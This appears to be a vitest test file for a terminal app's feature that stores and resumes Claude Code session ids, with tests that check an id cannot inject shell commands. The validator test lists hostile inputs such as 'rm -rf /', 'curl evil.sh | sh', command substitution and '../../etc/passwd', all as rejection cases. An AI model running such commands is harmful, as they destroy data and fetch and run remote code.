import { describe, it, expect } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

import {
  CLAUDE_SESSION_ID_RE,
  isValidClaudeSessionId,
  buildResumeCommand,
  stampClaudeSessionIds,
  listKnownTranscriptIds,
  pruneDeadClaudeSessions,
} from '../../src/main/claude-resume';

const ID_A = '11111111-2222-3333-4444-555555555555';
const ID_B = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee';

function leaf(surfaces: Array<Record<string, unknown>>) {
  return { type: 'leaf', paneId: 'pane-1', surfaces };
}
function split(a: unknown, b: unknown) {
  return { type: 'split', direction: 'horizontal', ratio: 0.5, children: [a, b] };
}
function terminal(id: string, extra: Record<string, unknown> = {}) {
  return { id, type: 'terminal', ...extra };
}

/**
 * The id reaches a shell command line, so the validator is the security
 * boundary for the whole feature — not a tidiness check.
 */
describe('isValidClaudeSessionId', () => {
  it('accepts the UUIDs Claude Code actually mints', () => {
    expect(isValidClaudeSessionId(ID_A)).toBe(true);
    expect(isValidClaudeSessionId('abc12345')).toBe(true); // 8 chars, the floor
  });

  it('rejects anything that could break out of a single shell token', () => {
    for (const hostile of [
      'abcdefgh; rm -rf /',
      'abcdefgh && curl evil.sh | sh',
      'abcdefgh`whoami`',
      'abcdefgh$(id)',
      'abcdefgh | tee /tmp/x',
      'abcdefgh with spaces',
      '../../etc/passwd',
      'C:\\Windows\\System32',
      "abcdefgh'",
      'abcdefgh"',
      'abcdefgh\nrm -rf /',
    ]) {
      expect(isValidClaudeSessionId(hostile), hostile).toBe(false);
    }
  });

  it('rejects too-short, over-long and non-string values', () => {
    expect(isValidClaudeSessionId('short')).toBe(false);
    expect(isValidClaudeSessionId('a'.repeat(129))).toBe(false);
    expect(isValidClaudeSessionId('a'.repeat(128))).toBe(true);
    expect(isValidClaudeSessionId(null)).toBe(false);
    expect(isValidClaudeSessionId(undefined)).toBe(false);
    expect(isValidClaudeSessionId(12345678)).toBe(false);
    expect(isValidClaudeSessionId({})).toBe(false);
  });

  it('is anchored at both ends', () => {
    // An unanchored pattern would match the good-looking middle of a bad value.
    expect(CLAUDE_SESSION_ID_RE.source.startsWith('^')).toBe(true);
    expect(CLAUDE_SESSION_ID_RE.source.endsWith('$')).toBe(true);
  });
});

describe('buildResumeCommand', () => {
  it('is a single claude --resume invocation', () => {
    expect(buildResumeCommand(ID_A)).toBe(`claude --resume ${ID_A}`);
  });
});

describe('stampClaudeSessionIds', () => {
  it('writes the live id onto the terminal that owns it', () => {
    const tree = leaf([terminal('surf-1')]);
    const out = stampClaudeSessionIds(tree, (id) => (id === 'surf-1' ? ID_A : null));
    expect(out.surfaces[0].claudeSessionId).toBe(ID_A);
  });

  it('recurses into both halves of a split', () => {
    const tree = split(leaf([terminal('surf-1')]), leaf([terminal('surf-2')]));
    const out: any = stampClaudeSessionIds(tree, (id) => (id === 'surf-2' ? ID_B : null));
    expect(out.children[0].surfaces[0].claudeSessionId).toBeUndefined();
    expect(out.children[1].surfaces[0].claudeSessionId).toBe(ID_B);
  });

  it('never stamps a non-terminal surface', () => {
    const tree = leaf([{ id: 'surf-1', type: 'browser' }, { id: 'surf-2', type: 'markdown' }]);
    const out = stampClaudeSessionIds(tree, () => ID_A);
    expect(out.surfaces[0].claudeSessionId).toBeUndefined();
    expect(out.surfaces[1].claudeSessionId).toBeUndefined();
  });

  it('refuses an id that would not survive the validator', () => {
    const tree = leaf([terminal('surf-1')]);
    const out = stampClaudeSessionIds(tree, () => 'x; rm -rf /');
    expect(out.surfaces[0].claudeSessionId).toBeUndefined();
  });

  // SessionEnd calls releaseAgent, so a cleanly-exited Claude looks up to
  // nothing. If a previously stamped id survived that, quitting Claude and
  // restarting wmux would resume the conversation the user just closed.
  it('REMOVES a stale id when the pane no longer hosts a session', () => {
    const tree = leaf([terminal('surf-1', { claudeSessionId: ID_A })]);
    const out = stampClaudeSessionIds(tree, () => null);
    expect('claudeSessionId' in out.surfaces[0]).toBe(false);
  });

  it('preserves every other surface field', () => {
    const tree = leaf([terminal('surf-1', { cwd: 'D:\\work', shell: 'pwsh', startupCommands: ['nvm use'] })]);
    const out = stampClaudeSessionIds(tree, () => ID_A);
    expect(out.surfaces[0]).toMatchObject({
      id: 'surf-1', type: 'terminal', cwd: 'D:\\work', shell: 'pwsh',
      startupCommands: ['nvm use'], claudeSessionId: ID_A,
    });
  });

  it('returns the identical object when nothing changed', () => {
    // Structural sharing keeps the 30s auto-save from rewriting untouched trees.
    const tree = leaf([terminal('surf-1', { claudeSessionId: ID_A })]);
    expect(stampClaudeSessionIds(tree, () => ID_A)).toBe(tree);
  });

  it('survives malformed trees rather than throwing on the save path', () => {
    expect(stampClaudeSessionIds(null, () => ID_A)).toBeNull();
    expect(stampClaudeSessionIds({ type: 'leaf' }, () => ID_A)).toEqual({ type: 'leaf' });
    expect(stampClaudeSessionIds({ type: 'split', children: [] }, () => ID_A))
      .toEqual({ type: 'split', children: [] });
  });
});

describe('listKnownTranscriptIds', () => {
  it('collects ids across every project directory', () => {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'wmux-claude-'));
    const projects = path.join(home, '.claude', 'projects');
    fs.mkdirSync(path.join(projects, 'proj-a'), { recursive: true });
    fs.mkdirSync(path.join(projects, 'proj-b'), { recursive: true });
    fs.writeFileSync(path.join(projects, 'proj-a', `${ID_A}.jsonl`), '');
    fs.writeFileSync(path.join(projects, 'proj-b', `${ID_B}.jsonl`), '');
    fs.writeFileSync(path.join(projects, 'proj-b', 'notes.md'), '');

    const ids = listKnownTranscriptIds(home);
    expect(ids).not.toBeNull();
    expect([...ids!].sort()).toEqual([ID_A, ID_B].sort());
  });

  // "Cannot tell" must not read as "none exist" — pruning on an unreadable
  // directory would throw away every id the first time wmux ran without Claude.
  it('returns null when there is no projects directory at all', () => {
    const home = fs.mkdtempSync(path.join(os.tmpdir(), 'wmux-claude-'));
    expect(listKnownTranscriptIds(home)).toBeNull();
  });
});

describe('pruneDeadClaudeSessions', () => {
  it('keeps ids that still have a transcript', () => {
    const tree = leaf([terminal('surf-1', { claudeSessionId: ID_A })]);
    const { tree: out, dropped } = pruneDeadClaudeSessions(tree, new Set([ID_A]));
    expect((out as any).surfaces[0].claudeSessionId).toBe(ID_A);
    expect(dropped).toBe(0);
  });

  it('drops an id whose conversation is gone', () => {
    const tree = leaf([terminal('surf-1', { claudeSessionId: ID_A })]);
    const { tree: out, dropped } = pruneDeadClaudeSessions(tree, new Set([ID_B]));
    expect('claudeSessionId' in (out as any).surfaces[0]).toBe(false);
    expect(dropped).toBe(1);
  });

  it('drops a hand-edited id that is not a valid handle, even if "known"', () => {
    const hostile = 'x; rm -rf /';
    const tree = leaf([terminal('surf-1', { claudeSessionId: hostile })]);
    const { tree: out, dropped } = pruneDeadClaudeSessions(tree, new Set([hostile]));
    expect('claudeSessionId' in (out as any).surfaces[0]).toBe(false);
    expect(dropped).toBe(1);
  });

  it('keeps everything when the transcript index could not be read', () => {
    const tree = leaf([terminal('surf-1', { claudeSessionId: ID_A })]);
    const { tree: out, dropped } = pruneDeadClaudeSessions(tree, null);
    expect(out).toBe(tree);
    expect(dropped).toBe(0);
  });

  it('counts drops across a whole split tree', () => {
    const tree = split(
      leaf([terminal('surf-1', { claudeSessionId: ID_A })]),
      leaf([terminal('surf-2', { claudeSessionId: ID_B }), terminal('surf-3')]),
    );
    const { dropped } = pruneDeadClaudeSessions(tree, new Set<string>());
    expect(dropped).toBe(2);
  });
});
